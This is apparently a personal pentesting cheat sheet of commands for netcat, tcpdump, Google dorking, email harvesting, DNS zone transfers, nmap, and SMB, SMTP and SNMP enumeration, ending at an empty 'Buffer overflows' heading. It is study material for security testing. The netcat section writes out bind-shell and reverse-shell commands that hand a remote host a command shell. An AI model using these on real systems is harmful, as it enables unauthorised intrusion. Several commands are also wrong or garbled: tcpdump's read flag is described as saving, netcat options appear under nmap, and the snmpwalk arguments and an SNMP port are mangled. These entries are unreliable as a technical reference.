*Pentesting*
Report
    The *executive overview* summarizes the attacks and indicates their potential business impact while suggesting remedies.
    The *technical summary* will include a methodological presentation of the technical aspects of the penetration test and is usually read by IT management and staff.


netcat
    *$ nc -nlvp 4444 # listens*
    *$ nc -nv 10.0.0.22 4444 # connects*
    *$ nc -nlvp 4444 > incoming.exe # serves incorming.exe through 4444*
    *$ >nc -nlvp 4444 -e cmd.exe # bind shell*
    *$ nc -nv 10.0.0.22 4444 -e /bin/bash # opens a reverse shell (you connect to a machine that can bash into yours)*


Wireshark
    libpcap and wincap libraries.
     network -> capture filters -> capture engine -> display filters
     follow TCP stream


Tcpdump
    *$ tcpdump -r file.pcap # saves output to file.pcap*
    *$ tcpdump -n src host 10.10.10.10 # saves packages from 10.10.10.10*
    *$ tcpdump -n dst host 10.10.10.10 # saves packages to 10.10.10.10*
    *$ tcpdump -n port 81 # saves packages where port 81 was involved*
    *$ tcpdump port not 22 # skips your ssh session traffic*
    *$ tcpdump -vv port 80 or port 443 # http and https traffic*


Google search
    site:xxx -site:www.xxx
    filetype: look for specific documents, pdf, docx, etc..
    inurl
    intitle
    Others https://www.exploit-db.com/google-hacking-database/


Email harvesting
    *$ theharvester -d guif.re -b google # find emails in google, bing, pgp etc*
    *$ whois guif.re # contact information for the domains they host*
    *$ recon-ng; use module; set DOMAIN guif.re; run;
    *recon/contacts/gather/http/api/whois_pocs # finds emails and employee names
    *recon/hosts/enum/http/web/xssed # finds xss published ad xssed.com
    *recon/hosts/gather/http/web/google_site # finds subdomains
    *recon/hosts/gather/http/web/ip_neighbor # finds IPs close to the domain and possible new domains*

DNS enumeration
    *$ host -t ns guif.re # find name servers*
    *$ host -t mx guif.re # find email servers*
    *$ for ip in $(cat list.txt);do host $ip.guif.re;done #subdomain bruteforcing*
    *$ for ip in $(seq 155 190);do host 50.7.67.$ip;done |grep -v "not found" # reverse dns lookup*
    *$ host -l guif.re ns1.guif.re # zone transfer request*
    *$ host -t ns guif.re | cut -d " " -f 4 # finds nameservers for a given domain*
    *$ dnsrecon -d guif.re -t axfr*
    *$ dnsenum guif.re*


Port scanning
    *$ nmap -sn 192.168.0.1-250 # identify hosts alive using ICMP ping*
    *$ nmap -nvv -w 1 IP 22-8 # 3way handshake scan*
    *$ nmap -nvv -u -z -w 1 IP 22-81 # UDP scan*
    UDP scanning consists on sending an empty UDP packet. Open: reply back. Closed: ICMP unreachable packet is received


Service enumeration
     *$ nmap -O target # fingerprints OS using TCP window size*
     *$ nmap -A target # fingerprints services using banner grabbing*
     *$ nmap -sV target # fingerprints services using banner grabbing*


NSE enumeration scripts
    *$ nmap IP --script smb-os-discovery.nse # SMB discovery*
    *$ nmap IP --script=dns-zone-transfer -p 53 # Zone transfer testing*


SMB enumeration
    versions 1,2,3.
    TCP 139, 445 and many UDP ports.
    *$ nbtscan -r 10.1.1.1/24 # netbios scan*
    A null SMB session can be used to gather passwords and useful information from SMB 1.
    *$ nbtscan -r 10.1.1.1/24 # does null session and extracts information.*
    *$ nmap -v -p 139,445 --script=smb-check-vulns --script-args=unsafe=1 10.1.1.1 #check for known SMB protocol vulnerabilities*


SMTP enumeration
    *>VRFY root # checks if a user exists*
    *EXPN root # asks the server if a user belongs to a mailing list*


Simple  Network  Management  Protocol (SNMP) enumeration
    Based on UDP, stateless and susceptible to UDP spoofing
    *$ nmap -sU --open -p 16110.1.1.1-254 -oG out.txt*
    *$ snmpwalk -c public -v1  10.1.1.1* # we need to know that there is a community called public
    *$ snmpwalk –c public –v1 192.168.11.204 1.3.6.1.4.1.77.1.2.25 # enumerate windows users*
    *$ snmpwalk 5c public 5v1 192.168.11.204 1.3.6.1.2.1.25.4.2.1.2 # enumerates running processes*


Vulnerability scanning
    nmap has many vulnerability scanning NSE scripts in /usr/share/nmap/scripts/*vuln*


OpenVAS
	Powerful vulnerability scanner with thousands of scan checks.
	setup: *$ openvas-setup; openvas-adduser; gsd*


Buffer overflows